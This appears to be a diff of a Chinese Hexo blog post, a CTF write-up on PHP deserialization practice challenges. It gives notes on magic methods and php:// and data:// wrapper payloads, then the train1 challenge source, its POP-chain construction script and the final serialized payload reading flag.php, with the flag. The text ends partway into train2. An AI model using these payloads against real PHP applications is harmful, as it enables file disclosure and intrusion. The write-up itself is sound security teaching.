@@ -1,4 +1,128 @@
-<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="dark"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg"><link rel="icon" href="/img/avatar.jpg"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="author" content="acdawn"><meta name="keywords" content="php反序列化"><meta name="description" content="php反序列化 12345678910111213#补充知识#抽象类不能实例化#被定义为抽象的方法只能声明调用方式，不能定义具体功实现#子类必须定义父类的所有方法，方法的调用方式必须匹配#__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。#__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。#__toString：当对象被当做一个字符串使用时调用。#__"><meta property="og:type" content="article"><meta property="og:title" content="php反序列化练习"><meta property="og:url" content="https://d4wnnn.github.io/2022/01/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/index.html"><meta property="og:site_name" content="D4wn"><meta property="og:description" content="php反序列化 12345678910111213#补充知识#抽象类不能实例化#被定义为抽象的方法只能声明调用方式，不能定义具体功实现#子类必须定义父类的所有方法，方法的调用方式必须匹配#__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。#__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。#__toString：当对象被当做一个字符串使用时调用。#__"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://d4wnnn.github.io/img/article_img_5.jpg"><meta property="article:published_time" content="2022-01-26T12:44:10.000Z"><meta property="article:modified_time" content="2023-05-09T13:30:11.385Z"><meta property="article:author" content="D4wn"><meta property="article:tag" content="php反序列化"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://d4wnnn.github.io/img/article_img_5.jpg"><meta name="referrer" content="no-referrer-when-downgrade"><title>php反序列化练习 - D4wn</title><link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var CONFIG={hostname:"d4wnnn.github.io",root:"/",version:"1.9.3",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!0,follow_dnt:!1,baidu:"104d1c240fe4777ab966bd68252f7714",google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null,path:"window.location.pathname",ignore_local:!1}},search_path:"/local-search.xml"};if(CONFIG.web_analytics.follow_dnt){var dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack;Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on"))}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><script async>if(!Fluid.ctx.dnt){var _hmt=_hmt||[];!function(){var t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?104d1c240fe4777ab966bd68252f7714";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}()}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css"><meta name="generator" content="Hexo 6.3.0"><style>mjx-container[jax="SVG"] {
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg">
+  <link rel="icon" href="/img/avatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="acdawn">
+  <meta name="keywords" content="php反序列化">
+  
+    <meta name="description" content="php反序列化 12345678910111213#补充知识#抽象类不能实例化#被定义为抽象的方法只能声明调用方式，不能定义具体功实现#子类必须定义父类的所有方法，方法的调用方式必须匹配#__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。#__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。#__toString：当对象被当做一个字符串使用时调用。#__">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化练习">
+<meta property="og:url" content="https://d4wnnn.github.io/2022/01/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="D4wn">
+<meta property="og:description" content="php反序列化 12345678910111213#补充知识#抽象类不能实例化#被定义为抽象的方法只能声明调用方式，不能定义具体功实现#子类必须定义父类的所有方法，方法的调用方式必须匹配#__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。#__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。#__toString：当对象被当做一个字符串使用时调用。#__">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://d4wnnn.github.io/img/article_img_5.jpg">
+<meta property="article:published_time" content="2022-01-26T12:44:10.000Z">
+<meta property="article:modified_time" content="2023-05-09T13:30:11.385Z">
+<meta property="article:author" content="D4wn">
+<meta property="article:tag" content="php反序列化">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://d4wnnn.github.io/img/article_img_5.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>php反序列化练习 - D4wn</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"d4wnnn.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"104d1c240fe4777ab966bd68252f7714","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?104d1c240fe4777ab966bd68252f7714";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><style>mjx-container[jax="SVG"] {
   direction: ltr;
 }
 
@@ -110,5 +234,709 @@ mjx-container[display="true"] {
 mjx-container[display="true"] + br {
   display: none;
 }
-</style></head><body><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>D4wn</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> 首页</a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> 归档</a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> 分类</a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> 标签</a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> 关于</a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/img/total.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="php反序列化练习"></span></div><div class="mt-3"><span class="post-meta mr-2"><i class="iconfont icon-author" aria-hidden="true"></i> acdawn </span><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2022-01-26 20:44" pubdate>2022年1月26日 晚上</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 5.3k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 45 分钟</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 style="display:none">php反序列化练习</h1><div class="markdown-body"><h1 id="php反序列化">php反序列化</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#补充知识</span><br><span class="hljs-comment">#抽象类不能实例化</span><br><span class="hljs-comment">#被定义为抽象的方法只能声明调用方式，不能定义具体功实现</span><br><span class="hljs-comment">#子类必须定义父类的所有方法，方法的调用方式必须匹配</span><br><span class="hljs-comment">#__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。</span><br><span class="hljs-comment">#__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。</span><br><span class="hljs-comment">#__toString：当对象被当做一个字符串使用时调用。</span><br><span class="hljs-comment">#__sleep:序列化对象之前就调用此方法(其返回需要一个数组)</span><br><span class="hljs-comment">#__wakeup:反序列化恢复对象之前调用该方法</span><br><span class="hljs-comment">#__call:当调用对象中不存在的方法会自动调用该方法。</span><br><span class="hljs-comment">#__get:在调用私有属性的时候会自动执行</span><br><span class="hljs-comment">#__isset()在不可访问的属性上调用isset()或empty()触发</span><br><span class="hljs-comment">#__unset()在不可访问的属性上使用unset()时触发</span><br></code></pre></td></tr></table></figure><blockquote><p><code>php://伪协议使用：访问输入输出流</code></p><p><code>比如：payload=php://filter/read=convert.base64-encode/resource=[文件名]</code></p><p><code>执行post提交的代码</code></p><p><code>比如：payload=php://input</code></p></blockquote><p><code>data://</code></p><blockquote><pre><code class="hljs">  `作用：执行php代码`
-  </code></pre><p><code>比如：payload=data://text/plain;base64,base64编码</code></p></blockquote><h2 id="train1">train1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php">Welcome to index.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-comment">//And Crack It!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>{<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>{<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);               <br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">'index.php'</span></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Welcome to '</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">"&lt;br&gt;"</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="hljs-variable">$this</span>-&gt;source)) {<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"hacker"</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">"index.php"</span>;<br>        }<br>    }<br><br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    }<br><br>}<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pop'</span>])){<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pop'</span>]);<br>}<br><span class="hljs-keyword">else</span>{<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>} <br></code></pre></td></tr></table></figure><blockquote><p>首先由Modifier类中的include找到突破口，要想include('flag.php'),首先要执行invoke魔术方法（当类被当作函数调用时触发），要执行_invoke,就要用到Test类中的get函数，要执行get函数(当调用不存在或者私有属性时触发)，用到了Show类的tostring方法（Test类并不含source），若执行tostring，则用到了Show中的正则匹配，即在wakeup时自动执行，因此构造payload,但是当我执行后发现并不显示flag，莫寒学长提示我用到了php伪协议，于是在flag前加上<code>php://filter/convert.base64-encode/resource=</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>{<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>=<span class="hljs-string">'php://filter/convert.base64-encode/resource=flag.php'</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>}<br><span class="hljs-variable">$temp</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$temp</span>-&gt;source=<span class="hljs-variable">$temp</span>;<br><span class="hljs-variable">$temp</span>-&gt;str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$temp</span>-&gt;str-&gt;p=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$temp</span>);<br><br></code></pre></td></tr></table></figure><p>把不可打印字符替换成%00得到最终payload：</p><blockquote><p>O:4:"Show":2:{s:6:"source";r:1;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"%00*%00var";s:52:"php://filter/convert.base64-encode/resource=flag.php";}}}</p></blockquote><p>运行得到base64编码的源码</p><blockquote><p>PD9waHAKICAgJGE9ImZsYWd7Z3JlYXRfeW91X2hhdmVfZmluaXNoZWRfdHJhaW4xfSI7CiAgIGVjaG8gIldhbnQgdG8gZ2V0IHRoZSBmbGFnIGRpcmVjdGx5PyBubyB3YXkiOwo/Pgo=</p></blockquote><p>解密后得到</p><blockquote>&lt;?php $a="flag{great_you_have_finished_train1}"; echo "Want to get the flag directly? no way"; ?&gt;</blockquote><p>得到flag{great_you_have_finished_train1}</p><h2 id="train2">train2</h2><p>补充知识：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Temp</span></span>{<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$Key</span>,<span class="hljs-variable">$Args</span></span>)</span>{<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Yes"</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$Key</span>;<br>            <span class="hljs-keyword">echo</span> PHP_EOL;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$Args</span>[<span class="hljs-number">2</span>];<br>        }<br>    }<br>    <span class="hljs-variable">$test</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Temp</span>();<br>    <span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">test1</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<span class="hljs-comment">//$Key是调用的不存在的函数名，如此时是test1，$Args是一个数组，存放传递的参数</span><br></code></pre></td></tr></table></figure><p>有了以上基础知识后，我们就可以开始破题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dd</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$add</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;code-&gt;<span class="hljs-title function_ invoke__">getShell</span>(<span class="hljs-variable">$this</span>-&gt;add);<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bb</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$head</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$body</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;head = <span class="hljs-string">"hanhan"</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;body = <span class="hljs-string">"baby"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">next</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;head.<span class="hljs-string">" "</span>.<span class="hljs-variable language_">$this</span>-&gt;body;<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$head</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$body</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;head = <span class="hljs-string">"hanhan"</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;body = <span class="hljs-string">"baby"</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">next</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;body = <span class="hljs-string">"You are"</span>.<span class="hljs-variable language_">$this</span>-&gt;head;<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name==<span class="hljs-string">'hacker'</span>){<br>            <span class="hljs-variable language_">$this</span>-&gt;pass-&gt;<span class="hljs-title function_ invoke__">next</span>();<br>        }<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ee</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$Key</span>,<span 